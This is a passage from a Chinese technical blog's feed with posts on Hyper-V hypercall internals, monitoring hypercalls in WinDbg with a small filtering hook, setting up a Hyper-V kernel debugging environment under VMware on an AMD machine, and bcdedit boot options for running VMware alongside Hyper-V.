bits</td><td>已经成功执行的 Repeat 数</td></tr><tr><td>Rsvd</td><td>20 bits</td><td>保留字段</td></tr></tbody></table><p>注意这里的 <code>Reps completed</code> 是针对整个 Repeat Hypercall 而言的，即整个 Repeat Hypercall 已经成功执行的 Repeat 数。</p><p>同样，输出参数也支持使用 XMM 寄存器传递。</p><h2 id="0x02-Hypercall-调用"><a href="#0x02-Hypercall-调用" class="headerlink" title="0x02. Hypercall 调用"></a>0x02. Hypercall 调用</h2><p>Windows 内核模块导出了一个函数 <code>HvlInvokeHypercall</code> 可以用于发起 Hypercall，该函数是对 <code>vmcall</code> / <code>vmmcall</code> 指令的一个包装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; u poi(nt!HvcallCodeVa)</span><br><span class="line">fffff804`3f330000 0f01d9          vmmcall</span><br><span class="line">fffff804`3f330003 c3              ret</span><br><span class="line"></span><br><span class="line">1: kd&gt; u nt!HvcallInitiateHypercall</span><br><span class="line">nt!HvcallInitiateHypercall:</span><br><span class="line">fffff804`40945080 4883ec28        sub     rsp,28h</span><br><span class="line">fffff804`40945084 488b059de22200  mov     rax,qword ptr [nt!HvcallCodeVa]</span><br><span class="line">fffff804`4094508b e850f20000      call    nt!_guard_retpoline_indirect_rax</span><br><span class="line">fffff804`40945090 4883c428        add     rsp,28h</span><br><span class="line">fffff804`40945094 c3              ret</span><br></pre></td></tr></table></figure><p>注意这里函数的调式符号为 <code>HvcallInitiateHypercall</code> ，只不过是以 <code>HvlInvokeHypercall</code> 的名义导出的。</p><h2 id="0x03-Hypercall-监控"><a href="#0x03-Hypercall-监控" class="headerlink" title="0x03. Hypercall 监控"></a>0x03. Hypercall 监控</h2><p>在 WinDbg 中，可以通过对 <code>poi(nt!HvcallCodeVa)</code> 下硬件执行断点来监控 Hypercall 的调用，拆分后的代码如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ba e1 poi(nt!HvcallCodeVa)</span><br><span class="line"></span><br><span class="line">.printf &quot;           Hypercall: 0x%X\n&quot;, rcx &amp; 0xFFFF</span><br><span class="line">.printf &quot;                Fast: 0x%X\n&quot;, (rcx &gt;&gt; 16) &amp; 1</span><br><span class="line">.printf &quot;Variable header size: 0x%X\n&quot;, (rcx &gt;&gt; 17) &amp; 0x1FF</span><br><span class="line">.printf &quot;           Is Nested: 0x%X\n&quot;, (rcx &gt;&gt; 26) &amp; 1</span><br><span class="line">.printf &quot;           Rep Count: 0x%X\n&quot;, (rcx &gt;&gt; 32) &amp; 0xFFF</span><br><span class="line">.printf &quot;     Rep Start Index: 0x%X\n&quot;, (rcx &gt;&gt; 48) &amp; 0xFFF</span><br><span class="line">k</span><br><span class="line">g</span><br></pre></td></tr></table></figure><p>WinDbg 仅支持单行命令，所以实际测试时需要把断点之后的命令写成一行、使用双引号括起来并且原有命令中的特殊字符需要进行转义处理。</p><p>使用上面的方法进行监控，WinDbg 会输出大量的日志，这其中不乏一些奇怪的日志：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">           Hypercall: 0xB</span><br><span class="line">                Fast: 0x0</span><br><span class="line">Variable header size: 0x0</span><br><span class="line">           Is Nested: 0x0</span><br><span class="line">           Rep Count: 0x0</span><br><span class="line">     Rep Start Index: 0x100</span><br><span class="line"> # Child-SP          RetAddr           Call Site</span><br><span class="line">00 fffffd89`ba061828 fffff800`37c89f7c 0xfffff800`35e10000</span><br><span class="line">01 fffffd89`ba061830 fffff800`384b9752 nt!HvlSendSyntheticClusterIpi+0x7c</span><br><span class="line">02 fffffd89`ba061860 fffff800`37abaecb hal!HalRequestIpi+0x532</span><br><span class="line">03 fffffd89`ba061b00 fffff800`37bc5e84 nt!PoIdle+0x45b</span><br><span class="line">04 fffffd89`ba061c60 00000000`00000000 nt!KiIdleLoop+0x44</span><br></pre></td></tr></table></figure><p>比如，按照微软官方文档的理解，这里 <code>Rep Count</code> 为 <code>0</code> ，所以编号为 <code>0xB</code> 的 Hypercall 应该是一个 Simple Hypercall，而 Simple Hypercall 的 <code>Rep Start Index</code> 也应该是 <code>0</code> ，但这里却为 <code>0x100</code> 。</p><p>当然，这种方法最主要的问题是没有对 Hypercall 进行过滤，这就会导致 WinDbg 需要频繁地处理断点，既耗费资源，操作也不是很方便。那么在 WinDbg 的条件断点中再加一个过滤条件可不可以呢？当然是可以的！但是在 WinDbg 进行过滤的时候，其实断点已经命中并且由 WinDbg 接管了，所以反应速度还是很慢。</p><p>Jaanus Kääp 通过在 WinDbg 中对内核模块进行 Patch，即对地址 <code>poi(nt!HvcallCodeVa)</code> 进行 HOOK，直接过滤掉不感兴趣的 Hypercall，这样 WinDbg 的反应速度就会快很多。具体的操作方法如下：</p><ol><li>写一段汇编指令过滤掉 Fast 类型的 Hypercall</li><li>将汇编指令编译成机器码</li><li>在内核模块的 <code>.text</code> 末尾找到一块可执行的空白区间用于存放机器码</li><li>修复 HOOK 的跳转<ul><li>把 <code>nt!HvcallCodeVa</code> 处的值修改为上述机器码的起始地址</li><li>过滤代码执行完毕后跳转回 <code>poi(nt!HvcallCodeVa)</code> 执行代码</li></ul></li></ol><p>过滤代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">        test    rcx, 0x10000</span><br><span class="line">        jnz     skip</span><br><span class="line">        int     3</span><br><span class="line">skip:</span><br><span class="line">        mov     rax, 0xfffff8014dfc0000</span><br><span class="line">        jmp     rax</span><br></pre></td></tr></table></figure><p>这里如果遇到非 Fast Hypercall 则通过 <code>int 3</code> 中断，会自动激活 WinDbg；也可以在这里下条件断点进行自动监控。</p><h2 id="0x04-参考文档"><a href="#0x04-参考文档" class="headerlink" title="0x04. 参考文档"></a>0x04. 参考文档</h2><ol><li>Jaanus Kääp 博客 <a href="https://foxhex0ne.blogspot.com/2020/05/hyper-v-0x1-hypercalls-part-1.html" target="_blank" rel="noopener">Hyper-V #0x1 - Hypercalls part 1</a></li><li>微软官方文档 <a href="https://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/reference/tlfs" target="_blank" rel="noopener">Hypervisor Top-Level Functional Specification</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Hyper-V Hypercall 相关基础知识介绍。&lt;/p&gt;
    
    </summary>
    
      <category term="Virtualization" scheme="http://programlife.net/categories/Virtualization/"/>
    
      <category term="Hyper-V" scheme="http://programlife.net/categories/Virtualization/Hyper-V/"/>
    
    
      <category term="Hyper-V" scheme="http://programlife.net/tags/Hyper-V/"/>
    
      <category term="Hypercall" scheme="http://programlife.net/tags/Hypercall/"/>
    
  </entry>
  
  <entry>
    <title>Hyper-V 调试环境搭建</title>
    <link href="http://programlife.net/2020/05/16/hyper-v-debugging/"/>
    <id>http://programlife.net/2020/05/16/hyper-v-debugging/</id>
    <published>2020-05-16T00:13:37.000Z</published>
    <updated>2020-05-16T12:17:23.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文将详细介绍使用 AMD CPU 的电脑如何利用 VMware Workstation 搭建 Hyper-V 的调试环境。</p><a id="more"></a><p>上一篇文章《<a href="https://programlife.net/2020/05/11/hyper-v-on-windows-10-notes/">Hyper-V on Windows 10 Notes</a>》提到了 Hyper-V 暂时不支持 AMD CPU 的嵌套虚拟化，所以就无法使用文章《<a href="https://msrc-blog.microsoft.com/2018/12/10/first-steps-in-hyper-v-research/" target="_blank" rel="noopener">First Steps in Hyper-V Research</a>》中介绍的 Hyper-V 嵌套虚拟化来搭建 Hyper-V 的调试环境，本文参考文章《<a href="https://foxhex0ne.blogspot.com/2020/05/hyper-v-0x0-research-setup.html" target="_blank" rel="noopener">Hyper-V #0x0 - Research setup</a>》中介绍的方法利用 VMware Workstation 来搭建 Hyper-V 的调试环境。</p><h2 id="0x01-物理机设置"><a href="#0x01-物理机设置" class="headerlink" title="0x01. 物理机设置"></a>0x01. 物理机设置</h2><p>物理机不需要安装 Hyper-V 组件，否则 VMware Workstation 将无法运行；如果物理机安装了 Hyper-V，可以参考文章《<a href="https://programlife.net/2020/05/10/vmware-workstation-incompatible-with-device-credential-guard/">VMware Workstation Incompatible with Device/Credential Guard</a>》临时禁用 Hyper-V。</p><h2 id="0x02-虚拟机设置"><a href="#0x02-虚拟机设置" class="headerlink" title="0x02. 虚拟机设置"></a>0x02. 虚拟机设置</h2><p>物理机安装好 VMware Workstation 之后，可以新建一个虚拟机并安装好最新的 64 位 Windows 10 操作系统。</p><h3 id="2-1-虚拟机-CPU-设置"><a href="#2-1-虚拟机-CPU-设置" class="headerlink" title="2.1 虚拟机 CPU 设置"></a>2.1 虚拟机 CPU 设置</h3><p>这里需要在 VMware Workstation 中为虚拟机的 CPU 开启虚拟化引擎：</p><ul><li>虚拟化 Intel VT-x/EPT 或 AMD-V/RVI(V)</li><li>虚拟化 CPU 性能计数器(U)</li></ul><p><img src="/uploads/202005/vmware-hyperv-cpu-settings.png" alt="CPU 虚拟化引擎设置"></p><p>同时，需要为虚拟机增加一个串口用于 Windows 内核调试（虚拟机默认有一个打印机，需要先把打印机删掉）：</p><ul><li>使用命名管道 <code>\\.\pipe\com_1</code> </li><li>该端是服务器</li><li>另一端是虚拟机</li></ul><p><img src="/uploads/202005/vmware-kernel-debug-serial-port.png" alt="虚拟机串口设置"></p><h3 id="2-2-虚拟机-Hyper-V-设置"><a href="#2-2-虚拟机-Hyper-V-设置" class="headerlink" title="2.2 虚拟机 Hyper-V 设置"></a>2.2 虚拟机 Hyper-V 设置</h3><p>这里需要在安装好的虚拟机中安装并启用 Hyper-V 组件，同时通过 <code>bcdedit</code> 设置相关的调试选项。</p><ul><li>内核调试设置（通过串口进行调试）</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /dbgsettings serial debugport:<span class="number">1</span> baudrate:<span class="number">115200</span></span><br><span class="line">bcdedit /debug on</span><br></pre></td></tr></table></figure><ul><li>Hyper-V 调试设置（通过网络进行调试）</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /hypervisorsettings NET HOSTIP:<span class="number">192.168</span>.<span class="number">6.1</span> PORT:<span class="number">50000</span></span><br><span class="line">bcdedit /set hypervisordebug on</span><br><span class="line">bcdedit /set hypervisorlaunchtype auto</span><br></pre></td></tr></table></figure><p>注意这里的 IP 地址是物理机中网卡 <code>VMware Network Adapter VMnet8</code> 的 IP 地址，端口设置为 <code>50000</code> 。这条命令执行完毕之后产生的一个 Key 需要记下来，后面 WinDbg 设置将会用到。</p><p><img src="/uploads/202005/hyperv-bcdedit-debug-settings.png" alt="虚拟机 Hyper-V 设置"></p><h2 id="0x03-WinDbg-设置"><a href="#0x03-WinDbg-设置" class="headerlink" title="0x03. WinDbg 设置"></a>0x03. WinDbg 设置</h2><p>复制两个 64 位 WinDbg 的快捷方式，其中一个附加如下参数用于调试 Windows 内核：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-k com:port=\\.\pipe\com_1,baud=115200,pipe,reconnect</span><br></pre></td></tr></table></figure><p>另一个附加如下参数用于调试 Hyper-V：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-k net:port=50000,key=前面生成的Key字符串</span><br></pre></td></tr></table></figure><h2 id="0x04-Hyper-V-调试"><a href="#0x04-Hyper-V-调试" class="headerlink" title="0x04. Hyper-V 调试"></a>0x04. Hyper-V 调试</h2><p>一切准备就绪之后，先打开两个 WinDbg，然后开启虚拟机，就可以开始调试了。</p><p>在调试 Hyper-V 的 WinDbg 中，可以查看 <code>hv</code> 模块的相关信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; lmvm hv</span><br><span class="line">Browse full module list</span><br><span class="line">start             end                 module name</span><br><span class="line">fffffb6a`57000000 fffffb6a`58800000   hv         (no symbols)</span><br><span class="line">    Loaded symbol image file: hvax64.exe</span><br><span class="line">    Image path: hvax64.exe</span><br><span class="line">    Image name: hvax64.exe</span><br><span class="line">    Browse all global symbols  functions  data</span><br><span class="line">    Image was built with /Brepro flag.</span><br><span class="line">    Timestamp:        DBBF3B47</span><br><span class="line">    CheckSum:         00110BD8</span><br><span class="line">    ImageSize:        01800000</span><br><span class="line">    Translations:     0000.04b0 0000.04e4 0409.04b0 0409.04e4</span><br><span class="line">    Information from resource tables:</span><br><span class="line"></span><br><span class="line">0: kd&gt; ?hv</span><br><span class="line">Evaluate expression: -5040831987712 = fffffb6a`57000000</span><br></pre></td></tr></table></figure><p>因为这里物理机使用的是 AMD 的 CPU，所以 <code>hv</code> 模块实际上是 <code>hvax64.exe</code> ；如果是 Intel 的 CPU，那么会是 <code>hvix64.exe</code> 。</p><p>在调试 Windows 内核的 WinDbg 中，可以查看 <code>hypercall</code> 对应的指令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">3: kd&gt; u poi(nt!HvcallCodeVa)</span><br><span class="line">fffff804`4cbe0000 0f01d9          vmmcall</span><br><span class="line">fffff804`4cbe0003 c3              ret</span><br><span class="line">fffff804`4cbe0004 8bc8            mov     ecx,eax</span><br><span class="line">fffff804`4cbe0006 b811000000      mov     eax,11h</span><br><span class="line">fffff804`4cbe000b 0f01d9          vmmcall</span><br><span class="line">fffff804`4cbe000e c3              ret</span><br><span class="line">fffff804`4cbe000f 488bc1          mov     rax,rcx</span><br><span class="line">fffff804`4cbe0012 48c7c111000000  mov     rcx,11h</span><br><span class="line">fffff804`4cbe0019 0f01d9          vmmcall</span><br><span class="line">fffff804`4cbe001c c3              ret</span><br><span class="line">fffff804`4cbe001d 8bc8            mov     ecx,eax</span><br><span class="line">fffff804`4cbe001f b812000000      mov     eax,12h</span><br><span class="line">fffff804`4cbe0024 0f01d9          vmmcall</span><br><span class="line">fffff804`4cbe0027 c3              ret</span><br><span class="line">fffff804`4cbe0028 488bc1          mov     rax,rcx</span><br><span class="line">fffff804`4cbe002b 48c7c112000000  mov     rcx,12h</span><br><span class="line">fffff804`4cbe0032 0f01d9          vmmcall</span><br><span class="line">fffff804`4cbe0035 c3              ret</span><br></pre></td></tr></table></figure><p>因为这里物理机使用的是 AMD 的 CPU，所以 <code>hypercall</code> 对应的指令为 <code>vmmcall</code> ；如果是 Intel 的 CPU，那么 <code>hypercall</code> 对应的指令为 <code>vmcall</code> 。</p><p>对 <code>vmmcall</code> 所在的位置下断点，需要使用硬件执行断点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">3: kd&gt; ba e1 poi(nt!HvcallCodeVa)</span><br><span class="line">3: kd&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">fffff804`4cbe0000 0f01d9          vmmcall</span><br><span class="line"></span><br><span class="line">1: kd&gt; k</span><br><span class="line"> # Child-SP          RetAddr           Call Site</span><br><span class="line">00 ffffbe0b`d64532c8 fffff804`4d9cc124 0xfffff804`4cbe0000</span><br><span class="line">01 ffffbe0b`d64532d0 fffff804`4da8e91c nt!HvcallpExtendedFastHypercall+0x54</span><br><span class="line">02 ffffbe0b`d64532e0 fffff804`4da8eb10 nt!HvlpFastFlushListTb+0xac</span><br><span class="line">03 ffffbe0b`d64533a0 fffff804`4da8e5f3 nt!HvlpFlushRangeListTb+0x88</span><br><span class="line">04 ffffbe0b`d6453400 fffff804`4da52642 nt!HvlFlushRangeListTb+0x63</span><br><span class="line">05 ffffbe0b`d6453450 fffff804`4d8f3e71 nt!MiFlushTbList+0x167fe2</span><br><span class="line">06 ffffbe0b`d64535a0 fffff804`4d8f5305 nt!MiCopyOnWrite+0x761</span><br><span class="line">07 ffffbe0b`d6453840 fffff804`4d8c986f nt!MiValidFault+0x295</span><br><span class="line">08 ffffbe0b`d64538b0 fffff804`4d8c8fae nt!MiUserFault+0x3cf</span><br><span class="line">09 ffffbe0b`d6453960 fffff804`4d9d041e nt!MmAccessFault+0x14e</span><br><span class="line">0a ffffbe0b`d6453b00 00007ff8`107805d3 nt!KiPageFault+0x35e</span><br><span class="line">0b 0000002e`3b4fb030 00000003`22e0813e 0x00007ff8`107805d3</span><br><span class="line">0c 0000002e`3b4fb038 000001b8`adbe82f0 0x00000003`22e0813e</span><br><span class="line">0d 0000002e`3b4fb040 00000000`00000000 0x000001b8`adbe82f0</span><br></pre></td></tr></table></figure><p>和系统调用一样，不同的 <code>hypercall</code> 对应不同的编号，编号可以用于定位对应的 Handler 函数。在地址 <code>hv+0xC00000</code> 处，每一个 <code>hypercall</code> 有一个 <code>0x18</code> 字节的结构体，其中结构体最前面的 <code>8</code> 字节便是对应的 Handler 函数的起始地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">4: kd&gt; dq hv+0xC00000</span><br><span class="line">fffffb6a`57c00000  fffffb6a`572321e0 00000000`00000000</span><br><span class="line">fffffb6a`57c00010  00000041`00000000 fffffb6a`5729ae90</span><br><span class="line">fffffb6a`57c00020  00000008`00000001 00000044`00000000</span><br><span class="line">fffffb6a`57c00030  fffffb6a`5722dcc0 00000018`00000002</span><br><span class="line">fffffb6a`57c00040  00000044`00000000 fffffb6a`57215e40</span><br><span class="line">fffffb6a`57c00050  00080018`00010003 00000044`00000000</span><br><span class="line">fffffb6a`57c00060  fffffb6a`5729b230 00000008`00000004</span><br><span class="line">fffffb6a`57c00070  0000003f`00000020 fffffb6a`57244200</span><br><span class="line"></span><br><span class="line">4: kd&gt; u fffffb6a`572321e0</span><br><span class="line">hv+0x2321e0:</span><br><span class="line">fffffb6a`572321e0 b802000000      mov     eax,2</span><br><span class="line">fffffb6a`572321e5 c3              ret</span><br><span class="line">fffffb6a`572321e6 cc              int     3</span><br></pre></td></tr></table></figure><h2 id="0x05-调试符号"><a href="#0x05-调试符号" class="headerlink" title="0x05. 调试符号"></a>0x05. 调试符号</h2><p>微软已经逐步开放了 Hyper-V 相关组件的调试符号，但是 <code>hv</code> 模块（即 <code>hvax64.exe / hvix64.exe</code> ）的调试符号暂时不对吃瓜群众开放。</p><p>微软还为 WinDbg 开发了一个调试 Hyper-V 的插件 <code>hvexts.dll</code> ，但目前也没有对外开放。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文将详细介绍使用 AMD CPU 的电脑如何利用 VMware Workstation 搭建 Hyper-V 的调试环境。&lt;/p&gt;
    
    </summary>
    
      <category term="Virtualization" scheme="http://programlife.net/categories/Virtualization/"/>
    
      <category term="Hyper-V" scheme="http://programlife.net/categories/Virtualization/Hyper-V/"/>
    
    
      <category term="Hyper-V" scheme="http://programlife.net/tags/Hyper-V/"/>
    
      <category term="VMware Workstation" scheme="http://programlife.net/tags/VMware-Workstation/"/>
    
  </entry>
  
  <entry>
    <title>Hyper-V on Windows 10 Notes</title>
    <link href="http://programlife.net/2020/05/13/hyper-v-on-windows-10-notes/"/>
    <id>http://programlife.net/2020/05/13/hyper-v-on-windows-10-notes/</id>
    <published>2020-05-13T00:13:37.000Z</published>
    <updated>2020-05-16T11:22:07.000Z</updated>
    
    <content type="html"><![CDATA[<p>周末花了点时间看了微软对 Hyper-V 的介绍文档《<a href="https://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/" target="_blank" rel="noopener">Hyper-V on Windows 10</a>》，顺便记点笔记。</p><a id="more"></a><ul><li><p><strong>About Hyper-V on Windows</strong></p><ul><li><em>Introduction to Hyper-V</em><ul><li>在 Windows 宿主机中启用 Hyper-V 之后，宿主机也会运行在 Hyper-V 之上（就像 Hyper-V 中创建的虚拟机一样），因此宿主机中某些对实时性要求较高的应用程序的运行可能会受到一定的影响；但与虚拟机不同的是，宿主机可以直接访问所有硬件资源。</li></ul></li></ul></li></ul><p><img src="/uploads/202005/hyperv-architecture.png" alt="Hyper-V 架构图"></p><ul><li><p><strong>Get started with Hyper-V</strong></p><ul><li><p><em>Install Hyper-V</em></p><ul><li>安装 Hyper-V 有多种方式，在 <strong>启用或关闭 Windows 功能</strong> 中安装是一种非常简单的方式。</li></ul></li><li><p><em>Create a Virtual Machine</em></p><ul><li><p>在创建虚拟机时会涉及到 Generation 的概念，微软建议创建二代虚拟机；一代虚拟机支持绝大多数的操作系统，二代虚拟机支持 Secure Boot（仅支持安装 64 位操作系统）；虚拟机一旦创建，Generation 便不可更改。</p></li><li><p>Secure Boot 会检查 Bootloader 的签名主体在 UEFI 数据库中是否存在，非法的 Bootloader 不会被运行。</p></li><li><p>如果要调试虚拟机操作系统的内核，那么需要先禁用 Secure Boot，然后通过 PowerShell 命令为虚拟机添加一个串口：</p><ul><li><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-VMComPort -VMName TestVM <span class="number">1</span> \\.\pipe\TestPipe</span><br></pre></td></tr></table></figure></li></ul></li><li><p>虚拟机默认会开启 <strong>使用自动检查点</strong>，即自动创建快照功能，建议关闭该选项。</p></li></ul></li><li><p><em>Hyper-V and PowerShell</em></p><ul><li>使用 PowerShell 可以很方便的和虚拟机进行各种交互，在 Fuzz 的时候应该会有用。</li></ul></li><li><p><em>Share devices with VMs</em></p><ul><li>虚拟机默认使用 <strong>增强会话</strong> 模式，这样我们可以通过 RDP 来访问虚拟机，体验和使用远程桌面是一样的；在该模式下，虚拟机和宿主机之间默认共享剪贴板并支持文件拖放，通过设置还可以共享音频设备、驱动器、打印机等；实际测试表明该模式下的画面清晰度更高，UI 不会有模糊的感觉。</li></ul></li><li><p><em>Connect with PowerShell Direct</em></p><ul><li>支持在宿主机中针对虚拟机执行 PowerShell 命令。</li></ul></li></ul></li><li><p><strong>Nested Virtualization</strong></p><ul><li><p>Hyper-V 支持嵌套虚拟化（目前仅支持 Intel CPU），可使用 PowerShell 命令为虚拟机启用该特性：</p><ul><li><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-VMProcessor -VMName &lt;VMName&gt; -ExposeVirtualizationExtensions <span class="literal">$true</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>Hyper-V 可能在未来的版本中增加对 AMD CPU 嵌套虚拟化的支持（参考 <a href="https://github.com/MicrosoftDocs/Virtualization-Documentation/issues/1276" target="_blank" rel="noopener">AMD nested virtualization?</a>）。</p></li></ul></li></ul><p>未启用嵌套虚拟化时的 Hyper-V 架构图如下：</p><p><img src="/uploads/202005/hyperv-no-nesting.png" alt="未启用嵌套虚拟化的 Hyper-V 架构图"></p><p>启用了嵌套虚拟化之后的 Hyper-V 架构图如下：</p><p><img src="/uploads/202005/hyperv-nesting.png" alt="启用了嵌套虚拟化的 Hyper-V 架构图"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;周末花了点时间看了微软对 Hyper-V 的介绍文档《&lt;a href=&quot;https://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hyper-V on Windows 10&lt;/a&gt;》，顺便记点笔记。&lt;/p&gt;
    
    </summary>
    
      <category term="Virtualization" scheme="http://programlife.net/categories/Virtualization/"/>
    
      <category term="Hyper-V" scheme="http://programlife.net/categories/Virtualization/Hyper-V/"/>
    
    
      <category term="Hyper-V" scheme="http://programlife.net/tags/Hyper-V/"/>
    
  </entry>
  
  <entry>
    <title>VMware Workstation Incompatible with Device/Credential Guard</title>
    <link href="http://programlife.net/2020/05/10/vmware-workstation-incompatible-with-device-credential-guard/"/>
    <id>http://programlife.net/2020/05/10/vmware-workstation-incompatible-with-device-credential-guard/</id>
    <published>2020-05-10T00:13:37.000Z</published>
    <updated>2020-05-30T10:44:56.000Z</updated>
    
    <content type="html"><![CDATA[<p>在 Windows 中启用 Hyper-V 之后，VMware Workstation 就不能用了，会提示“VMware Workstation 与 Device/Credential Guard 不兼容。在禁用 Device/Credential Guard 后，可以运行 VMware Workstation”，然而禁用 Device/Credential Guard 并不能解决问题。</p><a id="more"></a><p><img src="/uploads/202005/vmware-workstation-incompatible-with-device-credential-guard.png" alt="VMware Workstation and Device/Credential Guard are not compatible"></p><p>启用 Hyper-V 之后，原来的宿主机操作系统实际上也变成了一台虚拟机，即宿主机操作系统是运行在 Hypervisor 之上的，此时再运行 VMware Workstation <strong><em>可能会产生嵌套虚拟化</em></strong>（此为猜测），而 Hyper-V 的虚拟机默认是没有开启嵌套虚拟化支持的。</p><p>一个可行的解决方法是通过 <code>bcdedit</code> 设置两套启动方案，一套启用 Hyper-V，另一套则禁用 Hyper-V（设置 <code>HypervisorLaunchType</code> 为 <code>OFF</code>）以便运行 VMware Workstation。</p><p><img src="/uploads/202005/bcdedit-hypervisor-launchtype.png" alt="通过 bcdedit 参数 HypervisorLaunchType 禁用 Hyper-V"></p><p>相关命令文本：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /<span class="built_in">set</span> &#123;current&#125; description <span class="string">"Windows 10 Hyper-V"</span></span><br><span class="line">bcdedit /copy &#123;current&#125; /d <span class="string">"Winows 10"</span></span><br><span class="line"><span class="comment">// 已将该项成功复制到 &#123;new_guid&#125;</span></span><br><span class="line">bcdedit /<span class="built_in">set</span> &#123;new_guid&#125; HypervisorLaunchType OFF</span><br><span class="line">bcdedit /displayorder &#123;current&#125; &#123;new_guid&#125;</span><br><span class="line">bcdedit /timeout <span class="number">10</span></span><br></pre></td></tr></table></figure><p>这里默认进入启用了 Hyper-V 的启动项，等待时间设置为 10 秒钟。</p><p><strong>2020/05/30 更新</strong></p><p>VMware Workstation 15.5 已经支持运行在 Hyper-V 模式下了，要求 Windows 至少是 Windows 10 20H1 build 19041.264 及更新版本，参考 <a href="https://blogs.vmware.com/workstation/2020/05/vmware-workstation-now-supports-hyper-v-mode.html" target="_blank" rel="noopener">VMware Workstation 15.5 Now Supports Host Hyper-V Mode</a> ：</p><blockquote><p><strong>How does VMware Workstation work before version 15.5.5?</strong> </p><p>VMware Workstation traditionally has used a Virtual Machine Monitor (VMM) which operates in privileged mode requiring direct access to the CPU as well as access to the CPU’s built in virtualization support (Intel’s VT-x and AMD’s AMD-V).  When a Windows host enables Virtualization Based Security (“<a href="https://docs.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs" target="_blank" rel="noopener">VBS</a>“) features, Windows adds a hypervisor layer based on Hyper-V between the hardware and Windows.  Any attempt to run VMware’s traditional VMM fails because being inside Hyper-V the VMM no longer has access to the hardware’s virtualization support.</p><p><strong>Introducing User Level Monitor</strong></p><p>To fix this Hyper-V/Host VBS compatibility issue, VMware’s platform team re-architected VMware’s Hypervisor to use Microsoft’s WHP APIs. This means <strong><em>changing our VMM to run at user level\</em></strong> instead of in privileged mode, as well modifying it to use the WHP APIs to manage the execution of a guest instead of using the underlying hardware directly.</p><p><strong>What does this mean to you?</strong></p><p>VMware Workstation/Player can now run when 